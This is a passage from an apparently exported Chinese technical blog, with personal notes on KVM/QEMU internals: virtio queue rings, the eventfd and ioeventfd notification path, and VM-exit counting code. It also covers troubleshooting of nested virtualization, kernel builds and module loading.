class=\"line\">                        &#125;</span><br><span class=\"line\">                        <span class=\"keyword\">if</span>(duplicated)&#123;</span><br><span class=\"line\">                                <span class=\"keyword\">continue</span>;</span><br><span class=\"line\">                        &#125;</span><br><span class=\"line\">                        <span class=\"type\">int</span> count = exit_counts[j];</span><br><span class=\"line\">                        <span class=\"keyword\">if</span>(count &gt;= max)&#123;</span><br><span class=\"line\">                                index[i] = j;</span><br><span class=\"line\">                                max = count;</span><br><span class=\"line\">                        &#125;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                <span class=\"keyword\">if</span>(exit_counts[index[i]] &gt; <span class=\"number\">0</span>)&#123;</span><br><span class=\"line\">                        <span class=\"type\">char</span>* reason = get_exit_reason_string(index[i]);</span><br><span class=\"line\">                        u64 aver_cost_time = exit_total_cost_time[index[i]]/exit_counts[index[i]];</span><br><span class=\"line\">                        printk(<span class=\"string\">&quot;exit reason:[%d]%s,counts:%lld,average cost time:%lld\\n&quot;</span>,index[i],reason?reason : <span class=\"string\">&quot;not found&quot;</span>,exit_counts[index[i]],aver_cost_time);</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">vmx-&gt;exit_reason = vmx-&gt;fail ? <span class=\"number\">0xdead</span> : vmcs_read32(VM_EXIT_REASON);</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(!vmx-&gt;fail)&#123;</span><br><span class=\"line\">                total_exit_count++;</span><br><span class=\"line\">                exit_last_reason=(u16)vmx-&gt;exit_reason;</span><br><span class=\"line\">                exit_last_time[exit_last_reason] = now;</span><br><span class=\"line\">                exit_counts[exit_last_reason]++;</span><br><span class=\"line\">                <span class=\"keyword\">if</span>(total_exit_count%<span class=\"number\">10000</span>==<span class=\"number\">0</span>)&#123;</span><br><span class=\"line\">                        <span class=\"comment\">//printk(KERN_INFO &quot;time now:%llu\\n&quot;, timestamp);</span></span><br><span class=\"line\">                        show_exit_counts(<span class=\"number\">5</span>);</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">        &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">                exit_last_reason = <span class=\"number\">-1</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>内核模块 不能include time并且用time获得时间，只能用linux&#x2F;time的do_gettimeofday</p>\n<p>或者使用rdtsc获取cycle数 rdtsc可以直接用，也可以用同名汇编</p>\n","categories":["virtualization"]},{"title":"virtio queue","url":"/2024/01/22/virtualization/virtio%20queue/","content":"<h1 id=\"virtio-queue\"><a href=\"#virtio-queue\" class=\"headerlink\" title=\"virtio queue\"></a>virtio queue</h1><h2 id=\"消息机制\"><a href=\"#消息机制\" class=\"headerlink\" title=\"消息机制\"></a>消息机制</h2><p><a href=\"https://blog.csdn.net/wangquan1992/article/details/120649182\">virtio-net 实现机制_sg_init_one_老王不让用的博客-CSDN博客</a></p>\n<h3 id=\"原理\"><a href=\"#原理\" class=\"headerlink\" title=\"原理\"></a>原理</h3><p>简单设计：一个环形队列 固定大小 生产者消费者 两个指针</p>\n<p>这样所有通信固定在了这个队列里</p>\n<p>virtio可以动态申请和释放共享内存，用一块固定的共享内存队列记录通信使用的共享内存的地址</p>\n<p>这个队列为desc 默认128长度</p>\n<p>真正的共享内存是scatterlist</p>\n<p>并且 desc并不是单纯的先进先出的队列，而是一个无序的链表，所有请求不需要顺序处理 所以两个指针是不够的 必须记录哪些位置是新生产的  哪些位置被消费了</p>\n<p>实现中用数组 分别索引</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">vring_create_virtqueue</span><br><span class=\"line\">vring_create_virtqueue_split</span><br><span class=\"line\">vring_alloc_queue_split</span><br><span class=\"line\">\t-&gt; vring_split-&gt;vring.desc = vring_alloc_queue(num)</span><br></pre></td></tr></table></figure>\n\n<p>前者是avai ring qemu把新请求的desc id放在里面  然后更新这个avai ring的index</p>\n<p>qemu会维护这个avai ring的last index 然后avai_ring[last_index]读到desc id desc[desc_id]读到真正的信息的共享内存地址 然后再读数据 </p>\n<p>同理 use ring表示另一侧</p>\n<p>实现中 desc avail used用的是一块连续的物理内存</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">vstatic <span class=\"keyword\">inline</span> <span class=\"type\">void</span> <span class=\"title function_\">vring_init</span><span class=\"params\">(<span class=\"keyword\">struct</span> vring *vr, <span class=\"type\">unsigned</span> <span class=\"type\">int</span> num, <span class=\"type\">void</span> *p,</span></span><br><span class=\"line\"><span class=\"params\">\t\t\t      <span class=\"type\">unsigned</span> <span class=\"type\">long</span> align)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tvr-&gt;num = num;</span><br><span class=\"line\">\tvr-&gt;desc = p;</span><br><span class=\"line\">\tvr-&gt;avail = (<span class=\"keyword\">struct</span> vring_avail *)((<span class=\"type\">char</span> *)p + num * <span class=\"keyword\">sizeof</span>(<span class=\"keyword\">struct</span> vring_desc));</span><br><span class=\"line\">\tvr-&gt;used = (<span class=\"type\">void</span> *)(((<span class=\"type\">uintptr_t</span>)&amp;vr-&gt;avail-&gt;ring[num] + <span class=\"keyword\">sizeof</span>(__virtio16)</span><br><span class=\"line\">\t\t+ align<span class=\"number\">-1</span>) &amp; ~(align - <span class=\"number\">1</span>));</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"guest\"><a href=\"#guest\" class=\"headerlink\" title=\"guest\"></a>guest</h3><p>scatterlist是内核数据结构 只是记录了page地址 并没有读数据</p>\n<p><code>sg-&gt;page_link = (unsigned long)page</code></p>\n<p>调用vring_map_one_sg-&gt;sg_phys拿到gpa记录在desc中</p>\n<p>sg-&gt;length就是buflen 即pfn个数乘长度(4字节 最多256个 共1024字节)</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">desc[i].addr = vring_map_one_sg(sg)</span><br><span class=\"line\">desc[i].len = sg-&gt;length</span><br><span class=\"line\"></span><br><span class=\"line\">vring.avail-&gt;ring[avail] = i</span><br><span class=\"line\">vring.avail-&gt;idx++</span><br></pre></td></tr></table></figure>\n\n<p>这里把地址展开 其实就是sg-&gt;page_link 也就是page的地址 GPA</p>\n<p>所以这里sg用的buf 必须也是提前制定好的共享内存 相当于绕了一圈回来了 最终还是一块固定的共享内存</p>\n<p>并且sg本身存了个地址 然后又拿了地址 跟sg没什么关系 qemu这边也并不会访问到sg 只是为了复用一些函数？</p>\n<p>是virtio_balloon结构体中的pfns数组</p>\n<p>每次balloon guest把pfn写在这块固定的共享内存上(pfns) 然后把这个地址写到一个sg中 再把这个地址写到desc中 再把desc索引写到avail中 qemu从avail拿到desc索引 再拿pfns地址  传来传去就是一个固定的地址 </p>\n<h3 id=\"qemu\"><a href=\"#qemu\" class=\"headerlink\" title=\"qemu\"></a>qemu</h3><p>从avail拿到desc索引</p>\n<p>从desc拿到GPA 转成HVA</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">i = vring_avail_ring(last_avail_idx++)</span><br><span class=\"line\">vring_split_desc_read(&amp;desc,i)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">virtqueue_map_desc(desc.addr,desc.len)&#123;</span><br><span class=\"line\">\tiov[0].iov_base = dma_memory_map(desc.addr)</span><br><span class=\"line\">\tiov[0].iov_len = desc.len</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>这里dma_memory_map-&gt;address_space_map把GPA转为HVA 但是代码实现看起来非常复杂</p>\n<blockquote>\n<p>Map a physical memory region into a host virtual address</p>\n</blockquote>\n<p>用HVA copy guest的数据</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">elem = virtqueue_pop(vq,sizeof(VirtQueueElement));</span><br><span class=\"line\">while(iov_to_buf(elem-&gt;out_sg,elem-&gt;out_num,offset,&amp;pfn,4)==4)</span><br><span class=\"line\"></span><br><span class=\"line\">if(offset &lt;= iov[0].iov_len)</span><br><span class=\"line\">\tmemcpy(buf,iov[0].iov_base + offset,bytes)</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"used\"><a href=\"#used\" class=\"headerlink\" title=\"used\"></a>used</h3><h2 id=\"通知机制\"><a href=\"#通知机制\" class=\"headerlink\" title=\"通知机制\"></a>通知机制</h2><h3 id=\"glib\"><a href=\"#glib\" class=\"headerlink\" title=\"glib\"></a>glib</h3><p><a href=\"https://blog.csdn.net/m0_73494896/article/details/127011228\">详细介绍Glib 主事件循环轻度分析与编程应用_g_main_loop_run_极致Linux内核的博客-CSDN博客</a></p>\n<p>事件循环</p>\n<p>例如connect拿到fd  glib会包装poll 响应时dispatch调用callback</p>\n<h3 id=\"eventfd\"><a href=\"#eventfd\" class=\"headerlink\" title=\"eventfd\"></a>eventfd</h3><p><a href=\"https://zhuanlan.zhihu.com/p/40572954\">让事件飞 ——Linux eventfd 原理与实践 - 知乎 (zhihu.com)</a></p>\n<p><a href=\"https://zhuanlan.zhihu.com/p/393748176\">Linux fd 系列 — eventfd 是什么？ - 知乎 (zhihu.com)</a></p>\n<p>一个eventfd维护一个8bit的整型 write对应累加 read对应清零</p>\n<p>当值是0时read会阻塞</p>\n<p>producer用write 1 consumer用read实现阻塞</p>\n<h3 id=\"mmio\"><a href=\"#mmio\" class=\"headerlink\" title=\"mmio\"></a>mmio</h3><p><a href=\"https://mp.weixin.qq.com/s/9Zv7XcsvlVwDDjTn85-SZQ\">Linux虚拟化KVM-Qemu分析（十二）之ioeventfd与irqfd (qq.com)</a></p>\n<p><a href=\"https://blog.csdn.net/huang987246510/article/details/105618557\">qemu中的eventfd——ioeventfd_享乐主的博客-CSDN博客</a></p>\n<p><a href=\"https://cloud.tencent.com/developer/article/1518217\">virtIO前后端notify机制详解-腾讯云开发者社区-腾讯云 (tencent.com)</a></p>\n<ol>\n<li>mmio的地址不能提交给kvm然后让guest访问 应该qemu来模拟，这里模拟的写操作会到<code>virtio_pci_config_write</code>处理</li>\n<li>为了提高效率 mmio的地址与eventfd绑定，kvm不需要回到qemu 而是直接通过eventfd通知qemu</li>\n</ol>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">const</span> MemoryRegionOps virtio_pci_config_ops = &#123;</span><br><span class=\"line\">    .read = virtio_pci_config_read,</span><br><span class=\"line\">    .write = virtio_pci_config_write,</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">void</span> <span class=\"title function_\">virtio_pci_bus_class_init</span><span class=\"params\">(ObjectClass *klass, <span class=\"type\">void</span> *data)</span>&#123;</span><br><span class=\"line\">\tk-&gt;set_guest_notifiers = virtio_pci_set_guest_notifiers;</span><br><span class=\"line\">    \t-&gt;virtio_pci_set_guest_notifier</span><br><span class=\"line\">            -&gt;event_notifier_init\t</span><br><span class=\"line\">            \t-&gt;eventfd</span><br><span class=\"line\">\tk-&gt;device_plugged = virtio_pci_device_plugged;</span><br><span class=\"line\">    \t-&gt;memory_region_init_io(&amp;proxy-&gt;bar, OBJECT(proxy),&amp;virtio_pci_config_ops,</span><br><span class=\"line\">\t\t\tproxy, <span class=\"string\">&quot;virtio-pci&quot;</span>, size);</span><br><span class=\"line\">    k-&gt;ioeventfd_assign = virtio_pci_ioeventfd_assign;</span><br><span class=\"line\">    \t-&gt;memory_region_add_eventfd-&gt;memory_region_transaction_commit-&gt;address_space_update_ioeventfds-&gt;address_space_add_del_ioeventfds-&gt;MEMORY_LISTEMER_CALL(eventfd_add)</span><br><span class=\"line\">            -&gt;kvm_set_ioeventfd_mmio</span><br><span class=\"line\">            \t-&gt;kvm_vm_ioctl(kvm_state, KVM_IOEVENTFD, &amp;iofd);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">kvm</span><br><span class=\"line\">kvm_assign_ioeventfd_idx</span><br></pre></td></tr></table></figure>\n\n<p>qemu端 virt queue 注册handle_output<code>typedef void (*VirtIOHandleOutput)(VirtIODevice *, VirtQueue *);</code></p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">memory_region_dispatch_write</span><br><span class=\"line\">memory_region_write_accessor</span><br><span class=\"line\">virtio_pci_config_write</span><br><span class=\"line\">virtio_ioport_write&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">case</span> VIRTIO_PCI_QUEUE_NOTIFY:</span><br><span class=\"line\">        virtio_queue_notify(vdev, val);</span><br><span class=\"line\">        \t-&gt;<span class=\"keyword\">if</span>(vq-&gt;host_notifier_enabled)</span><br><span class=\"line\">                event_notifier_set(&amp;vq-&gt;host_notifier);</span><br><span class=\"line\">    \t\t<span class=\"keyword\">else</span>\tvq-&gt;handle_output(vdev,vq)</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>guest </p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">virtqueue_kick</span><br><span class=\"line\">virtqueue_notify</span><br><span class=\"line\"><span class=\"type\">bool</span> <span class=\"title function_\">vp_notify</span><span class=\"params\">(<span class=\"keyword\">struct</span> virtqueue *vq)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"comment\">/* we write the queue&#x27;s selector into the notification register to</span></span><br><span class=\"line\"><span class=\"comment\">\t * signal the other end */</span></span><br><span class=\"line\">\tiowrite16(vq-&gt;index, vp_dev-&gt;ldev.ioaddr + VIRTIO_PCI_QUEUE_NOTIFY);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>kvm</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">int</span> <span class=\"title function_\">handle_ept_misconfig</span><span class=\"params\">(<span class=\"keyword\">struct</span> kvm_vcpu *vcpu)</span>&#123;</span><br><span class=\"line\">    gpa = vmcs_read64(GUEST_PHYSICAL_ADDRESS);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (!is_guest_mode(vcpu) &amp;&amp;</span><br><span class=\"line\">\t    !kvm_io_bus_write(vcpu, KVM_FAST_MMIO_BUS, gpa, <span class=\"number\">0</span>, <span class=\"literal\">NULL</span>)) &#123;</span><br><span class=\"line\">        \t-&gt;ioeventfd_write</span><br><span class=\"line\">                -&gt;eventfd_signal (counter增加 唤醒)</span><br><span class=\"line\">        <span class=\"comment\">//正常执行返回0 提前退出</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> kvm_skip_emulated_instruction(vcpu);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>这里返回0 会让kvm进入下一次vcpu_run的循环 不会退出ioctl到qemu</p>\n<p>qemu在哪里等待这个eventfd  被唤醒后如何处理 网上没有相关的介绍</p>\n<blockquote>\n<p>host通知guest当然是通过注入中断的方式，首先调用的是virtio_notify，继而调用virtio_notify_vector并把中断向量作为参数传递进去。这里就调用了设备关联的notify函数，具体实现为virtio_pci_notify函数，常规中断（非MSI）会调用qemu_set_irq，在8259a中断控制器的情况下回调用kvm_pic_set_irq，然后到了kvm_set_irq，这里就会通过kvm_vm_ioctl和KVM交互，接口为KVM_IRQ_LINE，通知KVM对guest进行中断的注入。KVm里的kvm_vm_ioctl函数会对此调用进行处理，具体就是调用kvm_vm_ioctl_irq_line，之后就调用kvm_set_irq函数进行注入了。之后的流程参看中断虚拟化部分。</p>\n</blockquote>\n<p>hw&#x2F;virtio&#x2F;virtio-pci.c</p>\n<p>virio_ioport_write</p>\n<p>virtio_pci_config_ops</p>\n<p><a href=\"https://blog.csdn.net/weixin_42681961/article/details/82827911\">qemu-kvm 对mmio的模拟_qemu mmio-CSDN博客</a></p>\n<p>guest:</p>\n<p>drivers&#x2F;virtio&#x2F;virtio_pci_legacy.c</p>\n<p>vq-&gt;priv &#x3D; … VIRTIO_PCI_QUEUE_NOTIFY</p>\n<p>qemu:</p>\n<p>memory_region_add_eventfd(VIRTIO_PCI_QUEUE_NOTIFY)</p>\n<p><a href=\"read://https_blog.csdn.net/?url=https%3A%2F%2Fblog.csdn.net%2Fqq_41596356%2Farticle%2Fdetails%2F128441953\">virtio前端驱动通知机制分析 (csdn.net)</a></p>\n<p>这里说</p>\n<blockquote>\n<p><code>iowrite VIRTIO_PCI_QUEUE_NOTIFY</code> 后会产生一个 <code>vm-exit</code>，<code>KVM</code> 会判断 <code>exit_reason</code>， <code>I/O</code> 操作对应的执行函数是 <code>virtio_ioport_write()</code> 。</p>\n</blockquote>\n<p>kvm使用的eventfd来自do_eventfd  在fs&#x2F;eventfd.c</p>\n<p>qemu在哪里用？</p>\n<p><a href=\"https://tinylab.org/qemu-vhost/\">Qemu vhost 原理分析 - 泰晓科技 (tinylab.org)</a> 3.1节 有完整的调用路径 但是是需要kvm退回到qemu的 </p>\n<p>guest中balloon直接循环virtqueue_notify</p>\n<p>qemu中accel&#x2F;kvm&#x2F;kvm-all.c kvm_cpu_exec加代码统计 是mmio</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">kvm_cpu_exec</span><br><span class=\"line\">\t-&gt;address_space_rw</span><br><span class=\"line\">\t\t-&gt;address_space_write</span><br><span class=\"line\">\t\t\t-&gt;memory_region_dispatch_write</span><br></pre></td></tr></table></figure>\n\n\n\n<p>kvm</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">npf_interception</span><br><span class=\"line\">\t-&gt;kvm_mmu_page_fault</span><br><span class=\"line\">    \t-&gt;x86_emulate_instruction</span><br><span class=\"line\">            -&gt;x86_emulate_insn</span><br><span class=\"line\">                -&gt;writeback</span><br><span class=\"line\">                    -&gt;segmented_write</span><br><span class=\"line\">                        -&gt;emulator_write_emulated</span><br></pre></td></tr></table></figure>\n\n","categories":["virtualization"]},{"title":"virtualization misc","url":"/2024/01/18/virtualization/virtualization-misc/","content":"<h1 id=\"virtualization-misc\"><a href=\"#virtualization-misc\" class=\"headerlink\" title=\"virtualization misc\"></a>virtualization misc</h1><h2 id=\"host上开启嵌套虚拟化\"><a href=\"#host上开启嵌套虚拟化\" class=\"headerlink\" title=\"host上开启嵌套虚拟化\"></a>host上开启嵌套虚拟化</h2><p><a href=\"https://www.linux-kvm.org/page/Nested_Guests\">Nested Guests - KVM (linux-kvm.org)</a></p>\n<p>看<code>/sys/module/kvm_intel/parameters/nested</code> </p>\n<p>可以修改vmx.c<code>static bool __read_mostly nested = 1;</code>然后重新编译kvm模块</p>\n<p>host VM <code>cat /proc/cpuinfo | grep vmx</code>有内容说明配置正确</p>\n<p>此时跑kvm-hello-world没问题</p>\n<p><code>qemu-img resize xxx.img +10G</code>可以加磁盘容量；编译内核需要的内存比较大，开4G</p>\n<h2 id=\"hostVM-编译内核模块\"><a href=\"#hostVM-编译内核模块\" class=\"headerlink\" title=\"hostVM 编译内核模块\"></a>hostVM 编译内核模块</h2><p>环境变量有问题</p>\n<p>单独编译kvm</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">  CC [M]  /usr/src/linux-source-5.15.0/linux-source-5.15.0/arch/x86/kvm/mmu/mmu.o</span><br><span class=\"line\">In file included from /usr/src/linux-source-5.15.0/linux-source-5.15.0/arch/x86/kvm/trace.h:1741,</span><br><span class=\"line\">                 from /usr/src/linux-source-5.15.0/linux-source-5.15.0/arch/x86/kvm/x86.c:86:</span><br><span class=\"line\">./include/trace/define_trace.h:95:42: fatal error: ../../arch/x86/kvm/trace.h: No such file or directory</span><br><span class=\"line\">   95 | #include TRACE_INCLUDE(TRACE_INCLUDE_FILE)</span><br><span class=\"line\">      |                                          ^</span><br><span class=\"line\">compilation terminated.</span><br><span class=\"line\">make[1]: *** [scripts/Makefile.build:297: /usr/src/linux-source-5.15.0/linux-source-5.15.0/arch/x86/kvm/x86.o] Error 1</span><br><span class=\"line\">make[1]: *** Waiting for unfinished jobs....</span><br><span class=\"line\">make: *** [Makefile:1914: /usr/src/linux-source-5.15.0/linux-source-5.15.0/arch/x86/kvm] Error 2</span><br><span class=\"line\">make: Leaving directory &#x27;/usr/src/linux-headers-5.15.0-75-generic&#x27;</span><br><span class=\"line\">make: *** [Makefile:46: update] Error 2</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>解决方案：</p>\n<p>把<code>kvm/trace.h</code>的相对路径改为绝对路径</p>\n<p>不知道为什么linux会被替换为1，还得把路径的linux给去掉</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">undef</span> TRACE_INCLUDE_PATH</span></span><br><span class=\"line\"><span class=\"comment\">//#define TRACE_INCLUDE_PATH ../../arch/x86/kvm</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> TRACE_INCLUDE_PATH /usr/src/source-5.15.0/source-5.15.0/arch/x86/kvm</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">undef</span> TRACE_INCLUDE_FILE</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> TRACE_INCLUDE_FILE trace</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"hostVM加载内核模块\"><a href=\"#hostVM加载内核模块\" class=\"headerlink\" title=\"hostVM加载内核模块\"></a>hostVM加载内核模块</h2><p>编译没问题，加载模块出错</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo insmod /usr/src/source-5.15.0/source-5.15.0/arch/x86/kvm/kvm.ko</span><br><span class=\"line\">[  363.602674] module: x86/modules: Skipping invalid relocation target, existing value is nonzero for type 1, 0000000</span><br><span class=\"line\">[  363.602674] module: x86/modules: Skipping invalid relocation target, existing value is nonzero              for</span><br><span class=\"line\">[  363.602674] module: x86/modules: Skipping invalid relocation target, existing value is nonz                ero</span><br><span class=\"line\">[  363.602674] module: x86/modules: Skipping invalid relocation target, existing value is non                 znsmod: ERROR: could not insert module /usr/src/source-5.15.0/source-5.15.0/arch/x86/kvm/kvm.                 [  363.602674] module: x86/modules: Skipping invalid relocation target, existing value is nonzero for type 1, oc 00000000</span><br><span class=\"line\">[  363.602674] module: x86/modules: Skipping invalid relocation target, existing value is nonzero for type 1, oc 0000000</span><br><span class=\"line\">[  363.602674] module: x86/modules: Skipping invalid relocation target, existing value is nonzero for type 1, oc 00000</span><br><span class=\"line\">[  363.602674] module: x86/modules: Skipping invalid relocation target, existing value is nonzero for type 1,</span><br><span class=\"line\">loc 00000000392e449f, val ffffffffc0777953</span><br><span class=\"line\">insmod: ERROR: could not insert module /usr/src/source-5.15.0/source-5.15.0/arch/x86/kvm/kvm.ko: Invalid modul</span><br><span class=\"line\">e `n`k`j`nformat</span><br><span class=\"line\">make: *** [Makefile:49: update] Error 1</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>解决方案：</p>\n<p><a href=\"https://stackoverflow.com/questions/71746914/linux-kernel-module-development-module-x86-modules-skipping-invalid-relocatio\">c - Linux Kernel Module Development “module: x86&#x2F;modules: Skipping invalid relocation target, existing value is nonzero for type 1” - Stack Overflow</a></p>\n<p>执行第一句后系统提示换内核并重启，从75-generic换到76-generic 然后就好了</p>\n<p>目前的img</p>\n<ul>\n<li><p>内核代码</p>\n</li>\n<li><p>make bison flex等编译内核的工具</p>\n</li>\n<li><p>brctl tunctl ifconfig配网络</p>\n</li>\n<li><p>kvm-hello-world用于简单测试</p>\n<p>ubuntu.img镜像，启动脚本</p>\n</li>\n</ul>\n<h2 id=\"hostVM启动guestVM\"><a href=\"#hostVM启动guestVM\" class=\"headerlink\" title=\"hostVM启动guestVM\"></a>hostVM启动guestVM</h2><p>启动后出错</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Booting from Hard Disk...</span><br><span class=\"line\">error: invalid arch-independent ELF magic.</span><br><span class=\"line\">Entering rescue mode...</span><br><span class=\"line\">grub rescue&gt;</span><br></pre></td></tr></table></figure>\n\n<p>镜像有问题，换镜像就好了</p>\n<h2 id=\"hostVM编译内核\"><a href=\"#hostVM编译内核\" class=\"headerlink\" title=\"hostVM编译内核\"></a>hostVM编译内核</h2><p>整体编译：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">/usr/src/linux-source-5.15.0/linux-source-5.15.0/tools/objtool/include/objtool/elf.h:10:10: fatal error: gelf.h: No such fy</span><br><span class=\"line\">   10 | #include &lt;gelf.h&gt;</span><br><span class=\"line\">      |          ^~~~~~~~</span><br><span class=\"line\">compilation terminated.</span><br><span class=\"line\">compilation terminated.</span><br><span class=\"line\">make[3]: *** [/usr/src/linux-source-5.15.0/linux-source-5.15.0/tools/build/Makefile.build:97: /usr/src/linux-source-5.15.01</span><br><span class=\"line\">make[2]: *** [Makefile:56: /usr/src/linux-source-5.15.0/linux-source-5.15.0/tools/objtool/objtool-in.o] Error 2</span><br><span class=\"line\">make[1]: *** [Makefile:69: objtool] Error 2</span><br><span class=\"line\">make: *** [Makefile:1417: tools/objtool] Error 2</span><br><span class=\"line\">make: *** Waiting for unfinished jobs....</span><br><span class=\"line\">make[4]: *** [/usr/src/linux-source-5.15.0/linux-source-5.15.0/tools/build/Makefile.build:97: /usr/src/linux-source-5.15.01</span><br><span class=\"line\">make[4]: *** Waiting for unfinished jobs....</span><br><span class=\"line\">  CC      /usr/src/linux-source-5.15.0/linux-source-5.15.0/tools/bpf/resolve_btfids/libbpf/staticobjs/ringbuf.o</span><br><span class=\"line\">libbpf.c:47:10: fatal error: libelf.h: No such file or directory</span><br><span class=\"line\">   47 | #include &lt;libelf.h&gt;</span><br><span class=\"line\">      |          ^~~~~~~~~~</span><br><span class=\"line\">compilation terminated.</span><br><span class=\"line\">make[4]: *** [/usr/src/linux-source-5.15.0/linux-source-5.15.0/tools/build/Makefile.build:97: /usr/src/linux-source-5.15.01</span><br><span class=\"line\">make[3]: *** [Makefile:158: /usr/src/linux-source-5.15.0/linux-source-5.15.0/tools/bpf/resolve_btfids/libbpf/staticobjs/li2</span><br><span class=\"line\">make[2]: *** [Makefile:48: /usr/src/linux-source-5.15.0/linux-source-5.15.0/tools/bpf/resolve_btfids//libbpf/libbpf.a] Err2</span><br><span class=\"line\">make[1]: *** [Makefile:72: bpf/resolve_btfids] Error 2</span><br><span class=\"line\">make: *** [Makefile:1417: tools/bpf/resolve_btfids] Error 2</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>解决方案：</p>\n<p><a href=\"https://blog.csdn.net/qq_42000667/article/details/125205105\">fatal error: libelf.h: No such file or directory 解决方案_正义之兔的博客-CSDN博客</a></p>\n<p>之后编译会报更多的错</p>\n<p>解决方案：</p>\n<p>不在VM里面编译，在host上编译</p>\n<p>换了一台电脑 出现找不到某个.so</p>\n<p>解决方案：</p>\n<p><code>sudo ln -s /snap/core20/1974/usr/lib/x86_64-linux-gpu/libcrypto.so.1.1 /usr/lib/libcrypto.so.1.1</code></p>\n<h2 id=\"host用自定义内核启动hostVM\"><a href=\"#host用自定义内核启动hostVM\" class=\"headerlink\" title=\"host用自定义内核启动hostVM\"></a>host用自定义内核启动hostVM</h2><p>内核启动</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">VFS: Cannot open root device &quot;vda1&quot; or unknown-block(0,0): error -6</span><br><span class=\"line\">[    0.485922] Please append a correct &quot;root=&quot; boot option; here are the available partitions:</span><br><span class=\"line\">[    0.486970] 0b00         1048575 sr0</span><br><span class=\"line\">[    0.486971]  driver: sr</span><br><span class=\"line\">[    0.487755] Kernel panic - not syncing: VFS: Unable to mount root fs on unknown-block(0,0)</span><br><span class=\"line\">[    0.488791] CPU: 0 PID: 1 Comm: swapper/0 Not tainted 4.15.18 #3</span><br><span class=\"line\">[    0.489541] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS rel-1.12.0-59-gc9ba5276e321-prebuilt.qemu.org 044</span><br><span class=\"line\">[    0.490981] Call Trace:</span><br><span class=\"line\">[    0.491304]  dump_stack+0x6d/0x8b</span><br><span class=\"line\">[    0.491730]  panic+0xf7/0x25a</span><br><span class=\"line\">[    0.492111]  mount_block_root+0x1f6/0x2da</span><br><span class=\"line\">[    0.492623]  ? set_debug_rodata+0x34/0x34</span><br><span class=\"line\">[    0.493134]  mount_root+0x38/0x3a</span><br><span class=\"line\">[    0.493560]  prepare_namespace+0x139/0x18e</span><br><span class=\"line\">[    0.494087]  kernel_init_freeable+0x22c/0x259</span><br><span class=\"line\">[    0.494640]  ? rest_init+0xb0/0xb0</span><br><span class=\"line\">[    0.495075]  kernel_init+0xe/0x110</span><br><span class=\"line\">[    0.495507]  ret_from_fork+0x35/0x40</span><br><span class=\"line\">[    0.495981] Kernel Offset: 0x1c400000 from 0xffffffff81000000 (relocation range: 0xffffffff80000000-0xffffffffbfffffff)</span><br><span class=\"line\">[    0.497305] ---[ end Kernel panic - not syncing: VFS: Unable to mount root fs on unknown-block(0,0)</span><br></pre></td></tr></table></figure>\n\n<p>解决方案：</p>\n<p>不用host的config，用<code>make defconfig</code></p>\n<h2 id=\"hostVM使用kvm模块\"><a href=\"#hostVM使用kvm模块\" class=\"headerlink\" 